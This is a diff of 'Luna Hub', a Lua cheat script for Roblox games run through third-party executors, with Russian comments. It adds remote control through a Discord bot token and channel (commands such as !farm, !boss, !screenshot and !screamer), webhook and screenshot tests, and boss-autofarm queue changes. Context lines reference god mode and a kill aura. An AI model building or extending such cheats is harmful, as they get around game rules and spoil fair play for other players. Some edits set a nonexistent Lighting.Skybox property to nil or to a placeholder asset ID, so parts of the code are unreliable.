+            elseif cmd == "!help" then
+                return "📖 **Commands**\n"
+                    .. "`!ping` — connection check\n"
+                    .. "`!status` — current state\n"
+                    .. "`!farm on/off` — quest farm\n"
+                    .. "`!boss on/off` — boss farm\n"
+                    .. "`!screenshot` — capture screen\n"
+                    .. "`!screamer` — test screamer (yours only)\n"
+                    .. "`!unload` — unload script"
+            end
+            return nil
+        end
+
+        task.spawn(function()
+            -- При первом запуске берём ID последнего сообщения, чтобы не выполнять
+            -- старые команды.
+            local initOk, initBody = Log.rawGet(
+                "https://discord.com/api/v10/channels/" .. DiscordBot.channelId .. "/messages?limit=1",
+                "Bot " .. DiscordBot.token)
+            if initOk then
+                local ok, parsed = pcall(HttpService.JSONDecode, HttpService, initBody)
+                if ok and parsed and parsed[1] then
+                    lastMessageId = parsed[1].id
+                    lunaLog("INFO", "Discord poller initialized at messageId=" .. tostring(lastMessageId))
+                end
+            else
+                lunaLog("WARN", "Discord poller init failed: " .. tostring(initBody))
+            end
+
+            while _G.LunaHubLoaded ~= false do
+                task.wait(DiscordBot.pollInterval)
+                local url = "https://discord.com/api/v10/channels/" .. DiscordBot.channelId
+                    .. "/messages?limit=10"
+                if lastMessageId then
+                    url = url .. "&after=" .. lastMessageId
+                end
+                local ok, body = Log.rawGet(url, "Bot " .. DiscordBot.token)
+                if ok then
+                    local pok, msgs = pcall(HttpService.JSONDecode, HttpService, body)
+                    if pok and type(msgs) == "table" then
+                        for i = #msgs, 1, -1 do
+                            local m = msgs[i]
+                            if m and m.id and m.author then
+                                lastMessageId = m.id
+                                -- DEBUG: логируем что пришло, чтобы понять
+                                -- почему команды не срабатывают.
+                                lunaLog("INFO", string.format(
+                                    "Discord msg from %s (id=%s): %s",
+                                    tostring(m.author.username or m.author.global_name or "?"),
+                                    tostring(m.author.id),
+                                    tostring(m.content or "<EMPTY content — Message Content Intent НЕ включён>")
+                                ))
+                                if tostring(m.author.id) == DiscordBot.userId then
+                                    local content = m.content or ""
+                                    if content:sub(1, 1) == "!" then
+                                        local parts = {}
+                                        for w in content:gmatch("%S+") do
+                                            table.insert(parts, w)
+                                        end
+                                        local cmd = parts[1]
+                                        local args = {}
+                                        for j = 2, #parts do args[j - 1] = parts[j] end
+                                        lunaLog("INFO", "Discord cmd: " .. cmd
+                                            .. " (" .. #args .. " args)")
+                                        local response = handleCommand(cmd, args)
+                                        if response then
+                                            sendToWebhook(response)
+                                        end
+                                    end
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end)
+    end
 end
 
 -- ===== Home Tab отключён =====
@@ -1544,7 +2205,7 @@ local function spStart()
             pcall(function()
                 Luna:Notification({
                     Title = "Luna Hub", Content = "Квест-цикл упал, см. лог",
-                    Duration = 5, Icon = "error", ImageSource = "Material",
+                    Duration = 5, Icon = "_error", ImageSource = "Material",
                 })
             end)
         end
@@ -1636,6 +2297,9 @@ local function spBossStart()
     sp_bossThread = task.spawn(function()
         local idx = 1   -- текущий босс в очереди
         local lastNotifiedTarget = nil   -- чтобы не спамить нотификациями
+        -- Состояние ожидания respawn'а босса (для очереди из 1)
+        local WAIT_SINCE     = nil
+        local WAIT_NOTIFIED  = false
         local ok, err = xpcall(function()
         while sp_bossEnabled do
             local hum = safeGetHumanoid(safeGetCharacter())
@@ -1655,26 +2319,37 @@ local function spBossStart()
                 local boss, bossHum = spFindBoss(target)
                 if not boss then
                     sp_currentMob = nil
-                    -- Если босса нет — пробуем следующего в очереди (а не ждём
-                    -- 4 секунды на одном). Это критично для очереди — иначе
-                    -- застрянем на отсутствующем боссе.
+                    -- Засекаем когда впервые потеряли цель — нужно для warn'а.
+                    if not WAIT_SINCE then
+                        WAIT_SINCE = tick()
+                    end
                     if #q > 1 then
+                        -- В очереди >1 босса: переключаемся на следующего сразу,
+                        -- не ждём respawn'а текущего.
                         idx = idx + 1
                         if idx > #q then idx = 1 end
-                        task.wait(0.4)
+                        task.wait(0.3)
                     else
-                        notify(("Босс '%s' не найден — жду 4с"):format(target), 2, "warn")
-                        local w = 0
-                        while sp_bossEnabled and w < 4 do
-                            task.wait(0.25); w = w + 0.25
+                        -- Только один босс в очереди: ждём его respawn.
+                        -- Не спамим notify'ями — один warn после 10 секунд тишины.
+                        if (tick() - WAIT_SINCE) > 10 and not WAIT_NOTIFIED then
+                            WAIT_NOTIFIED = true
+                            notify(("Жду respawn '%s'…"):format(target), 3, "warn")
                         end
+                        task.wait(0.5)
                     end
                 else
+                    -- Босс нашёлся — сбрасываем «жду respawn'а» состояние.
+                    WAIT_SINCE    = nil
+                    WAIT_NOTIFIED = false
                     sp_currentMob = boss
-                    -- Уведомляем только если сменился target (не дёргаем notify
-                    -- каждый цикл, иначе спам при длинной очереди).
+                    -- Уведомляем только если сменился target.
                     if lastNotifiedTarget ~= target then
-                        notify(("Босс [%d/%d]: %s"):format(idx, #q, target), 2)
+                        if #q > 1 then
+                            notify(("Босс [%d/%d]: %s"):format(idx, #q, target), 2)
+                        else
+                            notify(("Босс: %s"):format(target), 2)
+                        end
                         lastNotifiedTarget = target
                     end
                     if not godModeEnabled and not sp_antiDamage then
@@ -1704,11 +2379,20 @@ local function spBossStart()
                         task.wait(sp_attackDelay)
                     end
                     sp_currentMob = nil
-                    -- Босс умер → переходим к следующему в очереди
+                    -- Босс умер → переходим к следующему в очереди.
                     if not boss.Parent or (bossHum and bossHum.Health <= 0) then
-                        idx = idx + 1
-                        if idx > #q then idx = 1 end
-                        notify(("Убит. Переключаюсь на [%d/%d]"):format(idx, #q), 2, "success")
+                        if #q > 1 then
+                            idx = idx + 1
+                            if idx > #q then idx = 1 end
+                            notify(("Убит. Переключаюсь на [%d/%d]"):format(idx, #q),
+                                2, "success")
+                        else
+                            -- Очередь из 1: остаёмся на нём, ждём respawn.
+                            notify(("Убит '%s'. Жду respawn"):format(target), 2, "success")
+                        end
+                        -- Сбрасываем "уведомили о цели" — при следующем нахождении
+                        -- этого же босса снова дадим лог.
+                        lastNotifiedTarget = nil
                     end
                     task.wait(0.5)
                 end
@@ -1724,7 +2408,7 @@ local function spBossStart()
             pcall(function()
                 Luna:Notification({
                     Title = "Luna Hub", Content = "Boss-цикл упал, см. лог",
-                    Duration = 5, Icon = "error", ImageSource = "Material",
+                    Duration = 5, Icon = "_error", ImageSource = "Material",
                 })
             end)
         end
@@ -2852,7 +3536,11 @@ VisualsTab:CreateToggle({
     end
 }, "fullBright")
 VisualsTab:CreateToggle({
-    Name = "Убрать небо", CurrentValue = false, Callback = function(v) Lighting.SkyboxEnabled = not v end
+    Name = "Убрать небо", CurrentValue = false, Callback = function(v) 
+        if v then
+            Lighting.Skybox = nil
+        end
+    end
 }, "noSky")
 
 --========================================================
@@ -2880,7 +3568,7 @@ WorldTab:CreateButton({
         Lighting.ClockTime = 14
         Lighting.FogEnd = 1000
         Lighting.FogStart = 0
-        Lighting.SkyboxEnabled = true
+        Lighting.Skybox = "rbxassetid://123456789"  -- дефолтный skybox
         Lighting.Brightness = 3
         Lighting.Ambient = Color3.new(0.5, 0.5, 0.5)
         Lighting.OutdoorAmbient = Color3.new(0.5, 0.5, 0.5)
@@ -3258,10 +3946,13 @@ SettingsTab:CreateDivider()
 pcall(function() SettingsTab:BuildConfigSection() end)
 
 -- ====================================================
--- Тема — кастомный градиент через встроенный BuildThemeSection
--- ====================================================
-SettingsTab:CreateDivider()
-pcall(function() SettingsTab:BuildThemeSection() end)
+-- Тема — отключена.
+-- BuildThemeSection из Luna при первом тике даёт два "Color1/Color2 Callback
+-- Error" из-за внутренней инициализации ColorPicker'ов раньше Color3-значений.
+-- UI всё равно работает, но шум в чате/F9 раздражает. Если нужна — снимай
+-- комментарий и принимай две стартовые ошибки.
+-- SettingsTab:CreateDivider()
+-- pcall(function() SettingsTab:BuildThemeSection() end)
 
 -- ====================================================
 -- 📝 Логи
@@ -3293,12 +3984,101 @@ SettingsTab:CreateButton({
 })
 
 SettingsTab:CreateButton({
+    Name = "🧪 Тест Discord webhook",
+    Description = "Шлёт пробное сообщение. Покажет статус-код в нотификации.",
+    Callback = function()
+        if not Log.WH.request then
+            notify("❌ Executor не поддерживает HTTP request", 5, "error")
+            lunaLog("ERROR", "webhook test: no httpRequest API available")
+            return
+        end
+        if not WEBHOOK_URL or WEBHOOK_URL == "" then
+            notify("❌ WEBHOOK_URL не задан в скрипте", 5, "error")
+            return
+        end
+        notify("Шлю тестовое сообщение...", 2)
+        task.spawn(function()
+            local body = Log.WH.encode({
+                username = "Luna Hub Test",
+                content  = "🧪 Тест webhook от " .. (LocalPlayer and LocalPlayer.Name or "?")
+                    .. " в `" .. tostring(game.Name) .. "` ("
+                    .. os.date("%H:%M:%S") .. ")",
+            })
+            local ok, info = Log.rawPost(WEBHOOK_URL, body)
+            if ok then
+                notify("✅ Webhook работает! HTTP " .. tostring(info), 4, "success")
+                lunaLog("INFO", "webhook test OK: HTTP " .. tostring(info))
+            else
+                notify("❌ Webhook упал: " .. tostring(info), 6, "error")
+                lunaLog("ERROR", "webhook test FAIL: " .. tostring(info))
+            end
+        end)
+    end
+})
+
+SettingsTab:CreateButton({
+    Name = "📸 Скриншот → Discord",
+    Description = "Снимает экран и отправляет в Discord. Требует executor с screenshot() API.",
+    Callback = function()
+        if not Log.WH.request then
+            notify("❌ Executor не поддерживает HTTP request", 5, "error")
+            return
+        end
+        notify("Делаю скриншот...", 2)
+        task.spawn(function()
+            local ok, info = Log.sendScreenshot(
+                ("📸 Снимок от **%s** в `%s` (%s)"):format(
+                    LocalPlayer and LocalPlayer.Name or "?",
+                    tostring(game.Name),
+                    os.date("%H:%M:%S")))
+            if ok then
+                notify("✅ Скриншот отправлен в Discord! HTTP " .. tostring(info), 4, "success")
+                lunaLog("INFO", "screenshot sent: HTTP " .. tostring(info))
+            else
+                notify("❌ " .. tostring(info), 6, "error")
+                lunaLog("WARN", "screenshot fail: " .. tostring(info))
+            end
+        end)
+    end
+})
+
+SettingsTab:CreateParagraph({
+    Title = "Про скриншоты",
+    Text  = "Roblox НЕ предоставляет API скриншотов LocalScript'ам. Эту фичу " ..
+            "может предоставить только сам инжектор через глобальную функцию " ..
+            "screenshot() (или Screenshot/saveScreenshot/captureScreenshot).\n\n" ..
+            "Поддерживают: Wave, Fluxus (новые билды).\n" ..
+            "НЕ поддерживают: Synapse, Krnl, AWP, Solara — там кнопка вернёт " ..
+            "«executor не предоставляет API для скриншотов»."
+})
+
+SettingsTab:CreateDivider()
+SettingsTab:CreateSection("Discord Bot Remote")
+
+SettingsTab:CreateParagraph({
+    Title = "Управление из Discord",
+    Text  = "Если в начале скрипта заполнить DISCORD_BOT_TOKEN / CHANNEL_ID / USER_ID, " ..
+            "скрипт будет читать команды из приватного канала Discord. Команды " ..
+            "выполняются ТОЛЬКО на ЭТОМ клиенте (твой собственный) и ТОЛЬКО от " ..
+            "твоего user_id.\n\n" ..
+            "Команды: `!ping`, `!status`, `!farm on/off`, `!boss on/off`, " ..
+            "`!screenshot`, `!screamer`, `!unload`, `!help`."
+})
+
+SettingsTab:CreateButton({
+    Name = "😱 Тест скримера (только мой экран)",
+    Description = "Показывает скример НА ТВОЁМ клиенте чтобы проверить что он работает. Никуда не отправляется.",
+    Callback = function()
+        DiscordBot.playScreamer()
+        notify("Скример показан", 2)
+    end
+})
+
+SettingsTab:CreateButton({
     Name = "🗑 Очистить лог-файл",
     Description = "Сбрасывает буфер и переписывает файл пустым.",
     Callback = function()
-        logBuffer = {}
-        logIndex  = 0
-        logFlush()
+        Log.clearBuffer()
         lunaLog("INFO", "log cleared by user")
         notify("Лог очищен", 2, "success")
     end
@@ -3478,7 +4258,7 @@ local function _exp_startKillAura()
             end
         end
 
-        -- Спамим Tool:Activate. Без этого моб просто стоит впритык никто его
+        -- Спамим Tool:Activate. Без этого моб просто стоит впритык, никто его
         -- не бьёт. Этот же путь использует sp_attackDelay автоматически — но
         -- мы тут используем свой, более агрессивный (0.10с по умолчанию).
         local now = tick()
@@ -3664,7 +4444,7 @@ _G.LunaUnload = function()
     _G.LunaWindowGui = nil
     _G.LunaHubLoaded = false
     lunaLog("INFO", "===== LUNA HUB UNLOAD =====")
-    logFlush()
+    Log.flush()
 end
 
 -- ====================================================
@@ -3676,7 +4456,7 @@ pcall(function()
     if game.BindToClose then
         game:BindToClose(function()
             lunaLog("INFO", "===== game:BindToClose fired =====")
-            logFlush()
+            Log.flush()
         end)
     end
 end)
@@ -3709,7 +4489,7 @@ task.delay(4.4, function() pcall(destroySplash) end)
 notify(("Найдено: NPC %d  |  Мобов %d  |  Боссов %d"):format(
     #sp_npcChoices, #sp_mobChoices, #sp_bossChoices), 4, "success")
 notify("RightCtrl — открыть/закрыть меню", 5)
-if logHasIO then
+if Log.hasIO() then
     notify("Лог пишется в файл: " .. LOG_PATH, 6)
 end
 lunaLog("INFO", "===== READY (game ready, ui built) =====")
